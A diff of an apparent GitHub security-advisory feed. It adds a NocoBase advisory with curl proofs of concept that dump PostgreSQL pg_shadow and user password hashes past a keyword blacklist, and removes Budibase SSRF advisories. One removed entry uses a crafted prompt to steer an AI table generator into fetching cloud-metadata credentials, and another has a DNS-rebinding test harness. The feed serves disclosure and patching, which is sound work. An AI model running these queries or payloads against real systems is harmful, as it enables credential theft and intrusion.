+        <title type="html"><![CDATA[[@nocobase/plugin-collection-sql] NocoBase: Sensitive Data Exposure via SQL Blacklist Bypass]]></title>
+        <id>https://github.com/advisories/GHSA-v8vm-cqh8-q87q</id>
+        <link href="https://github.com/advisories/GHSA-v8vm-cqh8-q87q"/>
+        <updated>2026-07-28T20:53:12.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="security-vulnerability-report-sensitive-data-exposure-via-sql-blacklist-bypass">Security Vulnerability Report: Sensitive Data Exposure via SQL Blacklist Bypass</h1>
+<h2 id="summary">Summary</h2>
+<p>The <code>checkSQL()</code> function in <code>plugin-collection-sql</code> implements a <strong>keyword-based blacklist</strong> to prevent dangerous SQL queries from being executed through the SQL Collection feature. However, the blacklist is <strong>incomplete</strong>: it only checks for a subset of dangerous PostgreSQL system functions and <strong>does not restrict access to sensitive system catalog tables</strong> such as <code>pg_shadow</code>, <code>pg_roles</code>, or <code>pg_stat_activity</code>.</p>
+<p>An authenticated user with the <code>admin</code> role can exploit this to <strong>dump PostgreSQL password hashes</strong> (<code>pg_shadow</code>), <strong>read all NocoBase user credentials</strong> (hashed passwords from the <code>users</code> table), and <strong>enumerate the full database schema</strong> — all data that admin users should never be able to access through the application interface.</p>
+<hr>
+<h2 id="affected-component">Affected Component</h2>
+<p><strong>File</strong>: <code>packages/plugins/@nocobase/plugin-collection-sql/src/server/utils.ts</code></p>
+<pre><code class="language-typescript">export const checkSQL = (sql: string) =&gt; {
+  const dangerKeywords = [
+    // PostgreSQL — BLOCKED
+    'pg_read_file',
+    'pg_read_binary_file',
+    'pg_stat_file',
+    'pg_ls_dir',
+    'pg_logdir_ls',
+    'pg_terminate_backend',
+    'pg_cancel_backend',
+    'current_setting',
+    'set_config',
+    'pg_reload_conf',
+    'pg_sleep',
+    'generate_series',
+
+    // MySQL — BLOCKED
+    'LOAD_FILE',
+    'BENCHMARK',
+    '@@global.',
+    '@@session.',
+
+    // SQLite — BLOCKED
+    'sqlite3_load_extension',
+    'load_extension',
+  ];
+
+  // NOT BLOCKED: pg_shadow, pg_roles, pg_stat_activity,
+  //                 information_schema, users table direct access, etc.
+
+  sql = sql.trim().split(';').shift();
+  if (!/^select/i.test(sql) &amp;&amp; !/^with([\s\S]+)select([\s\S]+)/i.test(sql)) {
+    throw new Error('Only supports SELECT statements or WITH clauses');
+  }
+  if (dangerKeywords.some((keyword) =&gt; sql.toLowerCase().includes(keyword.toLowerCase()))) {
+    throw new Error('SQL statements contain dangerous keywords');
+  }
+};
+</code></pre>
+<p>The <code>execute</code> action in <code>sql.ts</code> passes user-supplied SQL directly through this insufficient check:</p>
+<pre><code class="language-typescript">// sql.ts — execute action
+execute: async (ctx: Context, next: Next) =&gt; {
+  const { sql } = ctx.action.params.values || {};
+  try {
+    checkSQL(sql);         // ← insufficient validation
+  } catch (e) {
+    ctx.throw(400, ctx.t(e.message));
+  }
+  // SQL is executed directly against the database
+  const data = await model.findAll({ attributes: ['*'], limit: 5, raw: true });
+  ctx.body = { data, fields, sources };
+}
+</code></pre>
+<hr>
+<h2 id="root-cause">Root Cause</h2>
+<p>The blacklist approach is <strong>fundamentally incomplete</strong>. It attempts to enumerate every dangerous construct but misses entire categories:</p>
+<ol>
+<li><strong>PostgreSQL system catalog tables</strong> — <code>pg_shadow</code>, <code>pg_authid</code>, <code>pg_roles</code>, <code>pg_stat_activity</code> are not restricted</li>
+<li><strong>Application-level sensitive tables</strong> — <code>users</code> (containing hashed passwords) can be queried directly</li>
+<li><strong><code>information_schema</code></strong> — full schema enumeration is possible</li>
+<li><strong>Schema-qualified variants</strong> — even some blocked functions could be bypassed via <code>pg_catalog.</code> prefix (e.g. <code>pg_catalog.pg_read_file</code> may bypass checks in older versions)</li>
+</ol>
+<p>The correct approach is an <strong>allowlist</strong> (whitelist) of permitted tables/schemas, not a blacklist of forbidden keywords.</p>
+<hr>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<p><strong>Prerequisites</strong>: A user account with the <code>admin</code> role (has the <code>pm.data-source-manager.collection-sql</code> ACL snippet).</p>
+<p><strong>Step 1</strong>: Authenticate and obtain a token:</p>
+<pre><code class="language-bash">TOKEN=$(curl -s -X POST http://&lt;TARGET&gt;/api/auth:signIn \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@example.com","password":"&lt;password&gt;"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['token'])")
+</code></pre>
+<p><strong>Step 2</strong>: Dump PostgreSQL password hashes from <code>pg_shadow</code>:</p>
+<pre><code class="language-bash">curl -s -X POST http://&lt;TARGET&gt;/api/sqlCollection:execute \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"sql":"SELECT usename, passwd FROM pg_shadow LIMIT 10"}'
+</code></pre>
+<p><strong>Response</strong>:</p>
+<pre><code class="language-json">{
+  "data": {
+    "data": [
+      {
+        "usename": "nocobase",
+        "passwd": "SCRAM-SHA-256$4096:wmmGvfjPHRDsnzjOfHCmUQ==$fAXKBU7y3Ymmgg0iq6ibc66fN+v3Q7FaX86RgxP0tTY=:enn2dRiXhUQ2N5o4bRtZLNB3B8FpAdKC8Cp3HZ/hSFU="
+      }
+    ]
+  }
+}
+</code></pre>
+<p><strong>Step 3</strong>: Dump NocoBase user credentials:</p>
+<pre><code class="language-bash">curl -s -X POST http://&lt;TARGET&gt;/api/sqlCollection:execute \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"sql":"SELECT id, email, username, password FROM users LIMIT 100"}'
+</code></pre>
+<p><strong>Response</strong> (verified):</p>
+<pre><code class="language-json">{
+  "data": {
+    "data": [
+      {
+        "id": 1,
+        "email": "admin@nocobase.com",
+        "username": "nocobase",
+        "password": "1afc4721f320c4e097ac4aaca33544e7dadcc8cd7d57d40240f987bdbcbc686b"
+      }
+    ]
+  }
+}
+</code></pre>
+<hr>
+<h2 id="additional-verified-bypass-queries">Additional Verified Bypass Queries</h2>
+<table>
+<thead>
+<tr>
+<th>Query</th>
+<th>Blocked?</th>
+<th>Data Exposed</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SELECT usename, passwd FROM pg_shadow</code></td>
+<td><strong>Not blocked</strong></td>
+<td>PostgreSQL DB user password hashes</td>
+</tr>
+<tr>
+<td><code>SELECT id, email, password FROM users</code></td>
+<td><strong>Not blocked</strong></td>
+<td>All NocoBase user credential hashes</td>
+</tr>
+<tr>
+<td><code>SELECT table_name FROM information_schema.tables</code></td>
+<td><strong>Not blocked</strong></td>
+<td>Full database schema enumeration</td>
+</tr>
+<tr>
+<td><code>SELECT rolname, rolsuper FROM pg_roles</code></td>
+<td><strong>Not blocked</strong></td>
+<td>All DB roles and superuser flags</td>
+</tr>
+<tr>
+<td><code>SELECT pid, query FROM pg_stat_activity</code></td>
+<td><strong>Not blocked</strong></td>
+<td>Live SQL queries from all sessions</td>
+</tr>
+<tr>
+<td><code>SELECT pg_read_file('/etc/passwd')</code></td>
+<td>Blocked</td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>SELECT current_setting('app.key')</code></td>
+<td>Blocked</td>
+<td>—</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="why-admin-required-still-matters">Why Admin-Required Still Matters</h2>
+<p>This vulnerability is rated <strong>High</strong> despite requiring admin-level authentication. The reasoning:</p>
+<h3 id="1-security-boundary-violation-scope-changed-→-sc">1. Security Boundary Violation (Scope Changed → S:C)</h3>
+<p>The <code>admin</code> role in NocoBase is an <strong>application-level</strong> role — it manages workflows, collections, and UI. It is <strong>not</strong> a database administrator. Accessing <code>pg_shadow</code> is a <strong>PostgreSQL system-level</strong> privilege that admins should never have. The <code>checkSQL()</code> function was explicitly created to enforce this boundary; bypassing it breaks the intended security model.</p>
+<h3 id="2-data-that-admin-cannot-access-through-normal-ui">2. Data That Admin Cannot Access Through Normal UI</h3>
+<p>Even with admin privileges, NocoBase's UI and API <strong>do not expose</strong>:</p>
+<ul>
+<li><code>pg_shadow</code> (PostgreSQL internal password store)</li>
+<li>Raw <code>users.password</code> hashes via standard API responses</li>
+<li>Full <code>information_schema</code> enumeration</li>
+</ul>
+<p>VUL-2 grants access to all of the above — data the application explicitly chose not to expose.</p>
+<h3 id="3-enables-lateral-movement">3. Enables Lateral Movement</h3>
+<p>The <code>pg_shadow</code> SCRAM-SHA-256 hashes can be subjected to offline dictionary attacks. If cracked, the attacker gains <strong>direct PostgreSQL access</strong> with the application's DB credentials — bypassing the NocoBase application layer entirely. This enables reading <strong>all data</strong> in the database (not just what NocoBase exposes), modifying records directly, and accessing data from other schemas.</p>
+<h3 id="4-enables-full-attack-chain-when-combined-with-other-vulnerabilities">4. Enables Full Attack Chain When Combined with Other Vulnerabilities</h3>
+<pre><code>Member user (lowest privilege)
+  → VUL-8: Trigger a pre-built RCE workflow (any logged-in user can trigger)
+  → VUL-1: RCE reads APP_KEY from process.env
+  → Forge JWT with admin role
+  → VUL-2: Dump pg_shadow + users.password
+  → Crack hashes → full PostgreSQL access
+</code></pre>
+<hr>
+<h2 id="impacted-api-endpoint">Impacted API Endpoint</h2>
+<pre><code>POST /api/sqlCollection:execute
+</code></pre>
+<ul>
+<li><strong>Authentication</strong>: Required (<code>admin</code> role)</li>
+<li><strong>ACL Snippet</strong> registered in <code>plugin.ts</code>:<pre><code class="language-typescript">this.app.acl.registerSnippet({
+  name: `pm.data-source-manager.collection-sql`,
+  actions: ['sqlCollection:*'],   // includes :execute
+});
+</code></pre>
+</li>
+<li>The <code>admin</code> role includes this snippet by default.</li>
+</ul>
+<hr>
+<h2 id="recommended-fixes">Recommended Fixes</h2>
+<h3 id="fix-1-immediate-extend-the-blacklist-with-system-catalog-tables">Fix 1 (Immediate): Extend the blacklist with system catalog tables</h3>
+<pre><code class="language-typescript">const dangerKeywords = [
+  // ... existing entries ...
+
+  // ADD: PostgreSQL system catalog tables with sensitive data
+  'pg_shadow',
+  'pg_authid',
+  'pg_auth_members',
+  'pg_stat_activity',
+  'pg_roles',
+  // Note: information_schema should also be restricted for non-DBA roles
+];
+</code></pre>
+<h3 id="fix-2-recommended-replace-blacklist-with-schema-allowlist">Fix 2 (Recommended): Replace blacklist with schema allowlist</h3>
+<p>Instead of blocking dangerous keywords, only allow queries against <strong>user-defined collection tables</strong>:</p>
+<pre><code class="language-typescript">// Allowlist approach: extract table names from AST and verify against known collections
+const allowedTables = await db.getCollectionNames(); // tables created by NocoBase users
+const referencedTables = extractTableNames(parsedSQL);
+if (!referencedTables.every(t =&gt; allowedTables.includes(t))) {
+  throw new Error('Query references tables outside the allowed scope');
+}
+</code></pre>
+<h3 id="fix-3-defense-in-depth-use-a-read-only-restricted-db-user">Fix 3 (Defense-in-depth): Use a read-only, restricted DB user</h3>
+<p>The application's DB connection should use a PostgreSQL user that:</p>
+<ul>
+<li>Does <strong>not</strong> have <code>SELECT</code> privilege on <code>pg_shadow</code> or <code>pg_authid</code></li>
+<li>Only has access to the application's own schema (<code>nocobase</code> schema)</li>
+</ul>
+<p>This ensures that even if the blacklist is bypassed, the DB user cannot access system catalogs.</p>
+<hr>
+<h2 id="environment">Environment</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NocoBase version</td>
+<td>2.0.59-full</td>
+</tr>
+<tr>
+<td>Database</td>
+<td>PostgreSQL 16.14</td>
+</tr>
+<tr>
+<td>Deployment</td>
+<td>Docker (<code>nocobase/nocobase:2.0.59-full</code>)</td>
+</tr>
+<tr>
+<td>Vulnerable file</td>
+<td><code>plugin-collection-sql/src/server/utils.ts</code> — <code>checkSQL()</code></td>
+</tr>
+<tr>
+<td>Vulnerable endpoint</td>
+<td><code>POST /api/sqlCollection:execute</code></td>
+</tr>
+<tr>
+<td>Auth required</td>
+<td>Admin role (<code>pm.data-source-manager.collection-sql</code> snippet)</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="timeline">Timeline</h2>
+<table>
+<thead>
+<tr>
+<th>Date</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2026-05-29</td>
+<td>Vulnerability discovered via whitebox source code audit of <code>utils.ts</code></td>
+</tr>
+<tr>
+<td>2026-05-29</td>
+<td>Exploit verified on live Docker instance — <code>pg_shadow</code> and <code>users.password</code> dumped</td>
+</tr>
+<tr>
+<td>2026-05-29</td>
+<td>Report submitted to maintainers</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="script-and-video-poc">Script and video PoC:</h2>
+<p><a href="https://github.com/user-attachments/files/28380402/poc_vul2_sqli.py">poc_vul2_sqli.py</a></p>
+<p><a href="https://github.com/user-attachments/assets/6e4e7a3d-e005-4ff8-ab9a-e44ae1365732">https://github.com/user-attachments/assets/6e4e7a3d-e005-4ff8-ab9a-e44ae1365732</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nocobase/nocobase/security/advisories/GHSA-v8vm-cqh8-q87q">https://github.com/nocobase/nocobase/security/advisories/GHSA-v8vm-cqh8-q87q</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-52888">https://nvd.nist.gov/vuln/detail/CVE-2026-52888</a></li>
+<li><a href="https://github.com/nocobase/nocobase/pull/9683">https://github.com/nocobase/nocobase/pull/9683</a></li>
+<li><a href="https://github.com/nocobase/nocobase/commit/4aecb60d151a9002004dcf984f63d62f17a6cb45">https://github.com/nocobase/nocobase/commit/4aecb60d151a9002004dcf984f63d62f17a6cb45</a></li>
+<li><a href="https://github.com/nocobase/nocobase/commit/87c548969ce9258dd7f0d9571c9453ae10bc3fc4">https://github.com/nocobase/nocobase/commit/87c548969ce9258dd7f0d9571c9453ae10bc3fc4</a></li>
+<li><a href="https://github.com/nocobase/nocobase/releases/tag/v2.0.62">https://github.com/nocobase/nocobase/releases/tag/v2.0.62</a></li>
+<li><a href="https://github.com/nocobase/nocobase/releases/tag/v2.1.0-alpha.46">https://github.com/nocobase/nocobase/releases/tag/v2.1.0-alpha.46</a></li>
+<li><a href="https://github.com/advisories/GHSA-v8vm-cqh8-q87q">https://github.com/advisories/GHSA-v8vm-cqh8-q87q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v8vm-cqh8-q87q</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-28T20:53:08.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[qti-neon] QTINeon has unauthenticated relay-to-host amplification via unbounded RECONNECT_REQUEST forwarding]]></title>
         <id>https://github.com/advisories/GHSA-85rg-p3fr-xc2f</id>
@@ -1893,465 +2841,5 @@ if __name__ == "__main__":
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-07-24T21:47:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server] Budibase: SSRF via bare fetch() in uploadUrl during AI table generation]]></title>
-        <id>https://github.com/advisories/GHSA-hfhx-w8p8-4hc7</id>
-        <link href="https://github.com/advisories/GHSA-hfhx-w8p8-4hc7"/>
-        <updated>2026-07-24T21:47:55.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="budibase-ssrf-via-bare-fetch-in-uploadurl-during-ai-table-generation">Budibase: SSRF via bare fetch() in uploadUrl during AI table generation</h1>
-<h2 id="summary">Summary</h2>
-<p>The <code>uploadUrl()</code> function in <code>packages/server/src/utilities/fileUtils.ts</code> uses a bare <code>fetch(url)</code> call without any SSRF protection. This function is invoked when the AI table generation feature processes LLM-generated attachment column values that are strings (URLs).</p>
-<p>A builder-level user can craft prompts that cause the LLM to generate internal IP addresses or cloud metadata endpoints as attachment URLs. When <code>generateRows()</code> calls <code>processAttachments()</code>, these URLs are fetched server-side without blacklist validation, allowing the attacker to reach internal services, cloud metadata APIs (169.254.169.254), or other network-internal resources.</p>
-<p>This is a variant of the same class of issue addressed in other Budibase code paths where <code>fetchWithBlacklist()</code> is correctly used to prevent SSRF.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<p>&lt;= 3.39.0 (current <code>lerna.json</code> version at time of analysis)</p>
-<h2 id="vulnerability-details">Vulnerability Details</h2>
-<h3 id="root-cause-uploadurl-uses-bare-fetch-without-ssrf-blacklist-check">Root Cause: uploadUrl() uses bare fetch() without SSRF blacklist check</h3>
-<pre><code class="language-typescript">// packages/server/src/utilities/fileUtils.ts:21-23
-export async function uploadUrl(url: string): Promise&lt;Upload | undefined&gt; {
-  try {
-    const res = await fetch(url)  // No blacklist validation
-</code></pre>
-<p>This is called from:</p>
-<pre><code class="language-typescript">// packages/server/src/sdk/workspace/ai/helpers/rows.ts:104-114
-async function processAttachments(
-  entry: Record&lt;string, any&gt;,
-  attachmentColumns: FieldSchema[]
-) {
-  function processAttachment(value: any) {
-    if (typeof value === "object") {
-      return uploadFile(value)
-    }
-
-    return uploadUrl(value)  // String values treated as URLs, fetched without protection
-  }
-</code></pre>
-<p>Which is triggered via <code>generateRows()</code> at line 34:</p>
-<pre><code class="language-typescript">// packages/server/src/sdk/workspace/ai/helpers/rows.ts:34
-        await processAttachments(entry, attachmentColumns)
-</code></pre>
-<h3 id="compare-with-correct-sibling-processurlfile-in-extractts">Compare with correct sibling: processUrlFile() in extract.ts</h3>
-<pre><code class="language-typescript">// packages/server/src/automations/steps/ai/extract.ts:139-144
-async function processUrlFile(
-  fileUrl: string,
-  fileType: SupportedFileType,
-  llm: LLMResponse
-): Promise&lt;ExtractInput&gt; {
-  const response = await fetchWithBlacklist(fileUrl)  // Correct: uses blacklist
-</code></pre>
-<p>The <code>fetchWithBlacklist()</code> function validates each URL (including redirects) against a blacklist of internal/private IP ranges before making the request:</p>
-<pre><code class="language-typescript">// packages/server/src/automations/steps/utils.ts:100-112
-export async function fetchWithBlacklist(
-  url: string,
-  request: RequestInit = {}
-): Promise&lt;Response&gt; {
-  const maxRedirects = 5
-  let nextUrl = url
-  // ...
-  for (let redirects = 0; redirects &lt;= maxRedirects; redirects++) {
-    await throwIfBlacklisted(nextUrl)  // Validates against private IP ranges
-    const response = await fetch(nextUrl, nextRequest)
-</code></pre>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p>Prerequisites: Builder-level authentication, AI feature enabled on the instance.</p>
-<pre><code class="language-bash"># Step 1: Authenticate as builder
-TOKEN=$(curl -s -X POST 'http://TARGET:10000/api/global/auth/default/login' \
-  -H 'Content-Type: application/json' \
-  -d '{"username":"builder@example.com","password":"password123"}' \
-  -c - | grep budibase:auth | awk '{print $NF}')
-
-# Step 2: Create an app with a table that has an attachment column
-APP_ID="app_dev_xxxx"  # Use existing app
-
-# Step 3: Use the AI table generation endpoint with a prompt designed to
-# produce internal URLs as attachment values.
-# The LLM will generate rows with attachment column values pointing to
-# internal services.
-curl -X POST "http://TARGET:10000/api/workspace/$APP_ID/ai/tables/generate" \
-  -H "Content-Type: application/json" \
-  -H "Cookie: budibase:auth=$TOKEN" \
-  -d '{
-    "prompt": "Create a table called Assets with columns: name (string), logo (attachment). Add one row: name=test, logo=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-  }'
-
-# The server will call uploadUrl("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-# which fetches the cloud metadata endpoint without any SSRF protection.
-# The response content is saved to object storage and a URL is returned in the row data.
-
-# Step 4: Read the created row to exfiltrate the metadata response
-curl -X GET "http://TARGET:10000/api/$APP_ID/rows?tableId=&lt;table_id&gt;" \
-  -H "Cookie: budibase:auth=$TOKEN"
-# The attachment URL in the response points to the saved metadata content
-</code></pre>
-<h2 id="impact">Impact</h2>
-<ul>
-<li>Attacker with builder access can read cloud instance metadata (AWS IAM credentials, GCP service account tokens)</li>
-<li>Internal service enumeration and data exfiltration from private network resources</li>
-<li>Port scanning of internal infrastructure via timing/error differences</li>
-<li>Bypass of network segmentation when Budibase is deployed in a DMZ or VPC</li>
-</ul>
-<h2 id="suggested-remediation">Suggested Remediation</h2>
-<p>Replace the bare <code>fetch()</code> in <code>uploadUrl()</code> with <code>fetchWithBlacklist()</code>:</p>
-<pre><code class="language-typescript">// packages/server/src/utilities/fileUtils.ts
-import fs from "fs"
--import fetch from "node-fetch"
-import path from "path"
-import { pipeline } from "stream"
-import { promisify } from "util"
-import * as uuid from "uuid"
-
-import { context, objectStore } from "@budibase/backend-core"
-import { Upload } from "@budibase/types"
-import { ObjectStoreBuckets } from "../constants"
-+import { fetchWithBlacklist } from "../automations/steps/utils"
-
-// ...
-
-export async function uploadUrl(url: string): Promise&lt;Upload | undefined&gt; {
-  try {
--    const res = await fetch(url)
-+    const res = await fetchWithBlacklist(url)
-
-    const extension = [...res.url.split(".")].pop()!.split("?")[0]
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-hfhx-w8p8-4hc7">https://github.com/Budibase/budibase/security/advisories/GHSA-hfhx-w8p8-4hc7</a></li>
-<li><a href="https://github.com/Budibase/budibase/pull/18866">https://github.com/Budibase/budibase/pull/18866</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/72e602d68daeebe3b95b0ed87acd351a38e327d7">https://github.com/Budibase/budibase/commit/72e602d68daeebe3b95b0ed87acd351a38e327d7</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.4">https://github.com/Budibase/budibase/releases/tag/3.39.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-hfhx-w8p8-4hc7">https://github.com/advisories/GHSA-hfhx-w8p8-4hc7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hfhx-w8p8-4hc7</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-24T21:44:44.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server] Budibase: SSRF via DNS rebinding in the REST datasource integration]]></title>
-        <id>https://github.com/advisories/GHSA-v42f-v8xc-j435</id>
-        <link href="https://github.com/advisories/GHSA-v42f-v8xc-j435"/>
-        <updated>2026-07-24T21:44:30.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Budibase's central outbound-fetch guard (<code>fetchWithBlacklist</code>) prevents SSRF/DNS-rebinding by resolving the target hostname, checking every resolved IP against the blacklist, and <strong>pinning</strong> the connection to the validated IP. The pin is implemented as a Node <code>http(s).Agent</code> (<code>makePinnedAgent</code>). The fix for CVE-2026-54353 relies on this pin to stop DNS rebinding.</p>
-<p>The REST datasource integration (<code>@budibase/server</code>) calls <code>fetchWithBlacklist</code> but performs the actual request with <strong>undici</strong>'s <code>fetch</code>. undici does not support the Node <code>agent</code> option — it is silently ignored — and instead uses its own <code>dispatcher</code>, which re-resolves the hostname's DNS at connection time. As a result, <strong>the validated/pinned IP is never used on the REST datasource path</strong>, and the DNS-rebinding protection that CVE-2026-54353 added is silently defeated for the single most-used outbound path in Budibase.</p>
-<p>An authenticated user who can configure/run a REST datasource (e.g. a builder/tenant) can use a rebinding hostname (public IP during validation, internal IP at connect) to make the server issue arbitrary, full-response HTTP requests to internal-only services — cloud metadata (IAM credential theft), the internal CouchDB/Redis/MinIO, and other internal endpoints — reading and, because REST datasources allow arbitrary method/body, writing or destroying internal data.</p>
-<h3 id="details">Details</h3>
-<p><strong>The guard pins the validated IP via a Node agent</strong> — <code>packages/backend-core/src/utils/outboundFetch.ts</code>:</p>
-<ul>
-<li><code>resolveSafePinnedIp(url)</code> resolves the hostname and checks every address against <code>isBlacklisted</code>, returning a single <code>pinnedIp</code> (lines ~39–53).</li>
-<li><code>makePinnedAgent(url, ip)</code> builds a <strong>Node</strong> <code>http.Agent</code>/<code>https.Agent</code> whose <code>lookup</code> always returns <code>pinnedIp</code>, so a node-fetch connection can only reach the validated IP (lines ~55–68).</li>
-<li><code>fetchWithBlacklist</code> passes that agent into the request: <code>fetchFn(nextUrl, { ...nextRequest, agent: makePinnedAgent(nextUrl, pinnedIp) })</code> (lines ~186–192). Each redirect hop is re-validated and re-pinned in the loop.</li>
-</ul>
-<p><strong>The REST integration overrides the transport with undici, which ignores <code>agent</code></strong> — <code>packages/server/src/integrations/rest.ts</code>:</p>
-<ul>
-<li><code>fetch</code> is imported from <strong><code>undici</code></strong> (top-of-file import block, ~line 30).</li>
-<li>The request is made by overriding <code>fetchFn</code> (lines ~767–793):<pre><code class="language-ts">const setDispatcher = (requestInput, requestUrl) =&gt; ({
-  ...requestInput,
-  dispatcher: getDispatcher({ rejectUnauthorized, url: requestUrl }),
-})
-...
-response = await coreUtils.fetchWithBlacklist(url, input, {
-  fetchFn: async (requestUrl, requestInput) =&gt;
-    fetch(requestUrl, setDispatcher(requestInput, requestUrl)), // undici.fetch
-})
-</code></pre>
-The options object reaching <code>undici.fetch</code> is <code>{ ...nextRequest, agent: &lt;pinned Node Agent&gt;, dispatcher: &lt;getDispatcher result&gt; }</code>. <strong>undici uses <code>dispatcher</code> and ignores <code>agent</code>.</strong></li>
-</ul>
-<p><strong>The dispatcher does no IP pinning</strong> — <code>packages/backend-core/src/utils/fetch.ts</code>:</p>
-<ul>
-<li><code>getDispatcher</code> → <code>createDispatcher</code> → (no proxy env) → <code>createDirectAgent</code> = <code>new Agent({ connect: { rejectUnauthorized } })</code> (lines ~109–114, ~161–172, ~183). This is a plain undici <code>Agent</code> with <strong>no <code>connect.lookup</code> / no pin</strong>, so undici resolves the hostname's DNS itself at connect time.</li>
-</ul>
-<p><strong>Net effect (TOCTOU / DNS rebinding):</strong> <code>fetchWithBlacklist</code> validates the hostname → safe public IP and builds a pinned Node agent; the REST path then connects via undici, which re-resolves the same hostname independently. With a rebinding domain (TTL 0: public IP during validation, <code>127.0.0.1</code> / <code>169.254.169.254</code> / internal IP at connect), the request lands on an internal service — exactly the gap CVE-2026-54353's pin was meant to close.</p>
-<p><strong>Scope of impact / why it's REST-specific:</strong> <code>rest.ts</code> is the only caller that overrides <code>fetchFn</code> with undici. All other outbound sinks (automation <code>outgoingWebhook</code>/<code>n8n</code>/<code>make</code>/<code>zapier</code>/<code>discord</code>/<code>slack</code>, and AI-extract's <code>processUrlFile</code>) use the default node-fetch-based <code>fetchWithBlacklist</code>, which <strong>does</strong> honor the pinned agent and is <strong>not</strong> affected. REST datasource queries are the most common outbound path, and the response body is returned to the caller (full-response SSRF, not blind).</p>
-<h3 id="poc">PoC</h3>
-<p>The PoC drives the <strong>real, unmodified</strong> guard code (<code>outboundFetch.ts</code> + <code>fetch.ts</code>, copied verbatim — sha256 verified) and reproduces the exact <code>rest.ts</code> call pattern. Only the <code>../blacklist</code> module is stubbed to model the rebinding <strong>input</strong> (validation observes a safe public IP). Requires Node 18+.</p>
-<pre><code class="language-bash"># prerequisite: a Budibase checkout; set BB to its path
-export BB=/path/to/budibase
-mkdir ssrf-poc &amp;&amp; cd ssrf-poc
-SRC="$BB/packages/backend-core/src"
-
-# 1) Copy the REAL guard code, verbatim (sha proves no edits)
-mkdir -p real/utils real/blacklist
-cp "$SRC/utils/outboundFetch.ts" real/utils/
-cp "$SRC/utils/fetch.ts"         real/utils/
-
-# 2) Scenario stub = the rebinding INPUT: validation sees a safe, non-blacklisted public IP
-cat &gt; real/blacklist/index.ts &lt;&lt;'EOF'
-const SAFE = "203.0.113.10" // RFC5737 TEST-NET-3, not blacklisted -&gt; validation passes
-export async function resolveAddress(_a: string): Promise&lt;string[]&gt; { return [SAFE] }
-export async function isBlacklisted(a: string): Promise&lt;boolean&gt; { return a !== SAFE }
-EOF
-
-# 3) Harness = REAL fetchWithBlacklist + REAL getDispatcher, exact rest.ts pattern
-cat &gt; entry.ts &lt;&lt;'EOF'
-import http from "http"
-import { fetch as undiciFetch } from "undici"
-import { fetchWithBlacklist } from "./real/utils/outboundFetch" // REAL guard
-import { getDispatcher } from "./real/utils/fetch"              // REAL dispatcher
-async function main() {
-  const server = http.createServer((_q, r) =&gt; r.end("INTERNAL_SECRET_RESPONSE"))
-  await new Promise&lt;void&gt;(r =&gt; server.listen(0, "127.0.0.1", r))
-  const port = (server.address() as any).port
-  const target = `http://localhost:${port}/` // OS resolves localhost -&gt; 127.0.0.1 at connect
-  console.log(`[*] internal service 127.0.0.1:${port}; guard validates host -&gt; 203.0.113.10 (safe), pins to it`)
-
-  // (A) REST datasource path: undici fetch + real getDispatcher (exactly rest.ts).
-  const restFetchFn = (u: string, i: any) =&gt;
-    undiciFetch(u, { ...i, dispatcher: getDispatcher({ url: u, rejectUnauthorized: true }) as any }) as any
-  let A: string
-  try { const r: any = await fetchWithBlacklist(target, { method: "GET" } as any, { fetchFn: restFetchFn }); A = `status ${r.status} body=${await r.text()}` }
-  catch (e: any) { A = `ERROR ${e.message}` }
-  console.log("(A) REST/undici path  -&gt;", A)
-
-  // (B) Negative control: default fetchFn (node-fetch) honors the pinned agent.
-  let B: string
-  try { const r: any = await fetchWithBlacklist(target, { method: "GET", timeout: 3000 } as any); B = `status ${r.status} body=${await r.text()}` }
-  catch (e: any) { B = `ERROR ${e.message}` }
-  console.log("(B) node-fetch path   -&gt;", B)
-
-  const bypass = A.includes("INTERNAL_SECRET_RESPONSE"), contained = !B.includes("INTERNAL_SECRET_RESPONSE")
-  console.log(`\nRESULT: ${bypass &amp;&amp; contained ? "PASS - undici path BYPASSES guard, node-fetch path CONTAINED" : "FAIL"}`)
-  server.close(); process.exit(bypass &amp;&amp; contained ? 0 : 1)
-}
-main()
-EOF
-
-# 4) Deps, bundle, run
-npm init -y &gt;/dev/null 2&gt;&amp;1
-npm install undici@6 node-fetch@2 esbuild
